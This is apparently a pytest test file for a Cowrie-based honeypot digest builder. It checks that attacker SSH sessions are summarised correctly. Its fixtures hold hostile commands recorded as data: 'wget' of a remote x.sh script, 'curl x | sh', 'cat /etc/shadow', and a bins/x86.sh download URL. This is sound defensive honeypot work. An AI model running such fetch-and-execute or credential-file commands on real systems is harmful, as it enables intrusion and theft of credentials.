from __future__ import annotations

import json
import os
from datetime import datetime, timedelta, timezone

import pytest

from vulnmaze.digest.builder import apply, build, new_digest, public_view
from vulnmaze.ingest.normalize import SessionSecrets, normalise

GOLDEN = "cowrie_session_basic.digest.json"
_T0 = datetime(2026, 9, 21, 3, 0, tzinfo=timezone.utc)


def _ts(seconds: float) -> str:
    """An ISO timestamp `seconds` after a fixed epoch second."""
    return (_T0 + timedelta(seconds=seconds)).isoformat()


def _events(fixtures, deid, name="cowrie_session_basic.jsonl") -> dict[str, list[dict]]:
    """Normalise a recorded JSONL fixture into {session: [event dict]} in file order."""
    secrets: dict[str, SessionSecrets] = {}
    out: dict[str, list[dict]] = {}
    for line in (fixtures / name).read_text().splitlines():
        event = json.loads(line)
        row = normalise(event, line, deid, secrets.setdefault(event["session"], SessionSecrets()))
        out.setdefault(row.session, []).append(row.as_dict())
    return out


def _main_session(events_by_session):
    return max(events_by_session.items(), key=lambda kv: len(kv[1]))


def _ev(eventid, second, **fields):
    """A normalised event at the given second of the session."""
    return {"eventid": eventid, "session": "s1", "ts": f"2026-10-01T00:00:{second:02d}+00:00", **fields}


EVENTS = [
    _ev("cowrie.session.connect", 0, src_ip_hmac="abc", src_prefix="198.51.0.0/16"),
    _ev("cowrie.login.failed", 1, username="root", password_hmac="p1", password_len=4),
    _ev("cowrie.login.success", 2, username="root", password_hmac="p2", password_len=6),
    _ev("cowrie.command.input", 4, input="uname -a"),
    _ev("cowrie.command.input", 10, input="wget http://198.51.100.1/x.sh"),
    _ev("cowrie.command.failed", 10),
    _ev("cowrie.session.closed", 12, duration_ms=12000),
]


def test_digest_summarises_a_session():
    """Logins, commands, failures, URLs, timing and closure are all captured."""
    d = build(EVENTS, "live", "s1")
    assert d["logins"]["n_failed"] == 1 and d["logins"]["n_success"] == 1 and d["logins"]["username"] == "root"
    assert [c["input"] for c in d["commands"]] == ["uname -a", "wget http://198.51.100.1/x.sh"]
    assert d["commands"][1]["failed"] and not d["commands"][0]["failed"]
    assert d["urls"] == ["http://198.51.100.1/x.sh"]
    assert d["timing"]["login_to_first_cmd_s"] == 2.0 and d["timing"]["gaps_s"] == [6.0]
    assert d["closed"] and d["duration_s"] == 12.0 and d["src_prefix"] == "198.51.0.0/16"


def test_apply_is_pure_unless_inplace():
    """apply leaves its input untouched by default, so digests can be rebuilt deterministically."""
    d = new_digest("live", "s1")
    out = apply(d, EVENTS[0])
    assert d["counts"]["events"] == 0 and out["counts"]["events"] == 1
    assert build(EVENTS, "live", "s1") == build(EVENTS, "live", "s1")


def test_piped_shell_commands_are_nested_not_typed():
    """Commands arriving within the subshell window after `| sh` are marked nested and excluded from timing."""
    events = [
        _ev("cowrie.login.success", 0, username="root"),
        _ev("cowrie.command.input", 1, input="curl x | sh"),
        _ev("cowrie.vulnmaze.route", 1, route="deterministic", command="sh"),
        _ev("cowrie.command.input", 1, input="id"),
    ]
    d = build(events, "live", "s1")
    assert d["commands"][1].get("nested") and d["counts"]["nested_commands"] == 1
    assert d["timing"]["gaps_s"] == [] and d["routes"]["deterministic"] == 1


def test_public_view_hides_internal_state():
    """The export view drops underscore-prefixed bookkeeping."""
    assert "_state" not in public_view(new_digest("live", "s1"))


def test_recorded_session_rebuilds_the_checked_in_digest(fixtures, deid):
    """Replaying the recorded session must give exactly the golden digest.

    If you change the digest on purpose, regenerate with
    VULNMAZE_UPDATE_GOLDEN=1 pytest dev/tests and review the diff.
    """
    session, events = _main_session(_events(fixtures, deid))
    digest = public_view(build(events, "live", session))
    path = fixtures / GOLDEN
    if os.environ.get("VULNMAZE_UPDATE_GOLDEN") == "1" or not path.exists():
        path.write_text(json.dumps(digest, indent=2, sort_keys=True) + "\n")
    assert digest == json.loads(path.read_text())


def test_recorded_digest_reads_as_a_real_attack(fixtures, deid):
    """The golden digest records the fingerprint, the risk routes and the nested subshell."""
    session, events = _main_session(_events(fixtures, deid))
    d = build(events, "live", session)
    assert d["closed"] is True
    assert d["logins"]["n_success"] == 1
    assert d["client"]["version"].startswith("SSH-2.0-paramiko")
    assert d["client"]["hassh"]
    assert "http://198.51.100.23/bins/x86.sh" in d["urls"]
    assert d["routes"]["privilege"] >= 3  # chpasswd, cat /etc/shadow, sudo -l
    assert d["routes"]["escalate_candidate"] == 1  # masscan
    nested = [c for c in d["commands"] if c.get("nested")]
    assert [c["input"] for c in nested] == ["cat /etc/shadow | head -1"]
    masscan = next(c for c in d["commands"] if c["input"].startswith("masscan"))
    assert masscan["failed"] and masscan["routes"] == ["escalate_candidate"]


def test_reading_a_digest_mid_session_equals_rebuilding_from_scratch(fixtures, deid):
    """The digest after k events equals a batch build of the first k, so a mid-session read is consistent."""
    session, events = _main_session(_events(fixtures, deid))
    running = new_digest("live", session)
    for k, event in enumerate(events, start=1):
        running = apply(running, event)
        assert running == build(events[:k], "live", session)


def test_timing_averages_fractional_gaps():
    """Sub-second human pacing survives into gap_mean_s."""
    gaps = [0.25, 1.5, 3.0, 0.75]
    stamps = [3.0]
    for gap in gaps:
        stamps.append(stamps[-1] + gap)
    events = [{"eventid": "cowrie.session.connect", "session": "s", "ts": _ts(0)},
              {"eventid": "cowrie.login.success", "session": "s", "ts": _ts(1), "username": "root"}]
    events += [{"eventid": "cowrie.command.input", "session": "s", "ts": _ts(t), "input": f"c{i}"}
               for i, t in enumerate(stamps)]
    d = build(events, "live", "s")
    assert d["timing"]["login_to_first_cmd_s"] == pytest.approx(2.0, abs=0.05)
    assert d["timing"]["gaps_s"] == pytest.approx(gaps, abs=0.05)
    assert d["timing"]["gap_mean_s"] == pytest.approx(sum(gaps) / len(gaps), abs=0.05)


def test_a_banner_grab_produces_an_empty_closed_digest(fixtures, deid):
    """A scanner that never authenticates still yields a closed digest with its client version."""
    (session, events), = _events(fixtures, deid, "cowrie_scanner_banner.jsonl").items()
    d = build(events, "live", session)
    assert d["commands"] == [] and d["logins"]["attempts"] == []
    assert d["client"]["version"] == "SSH-2.0-Go"
    assert d["closed"] and d["duration_s"] == 0.12
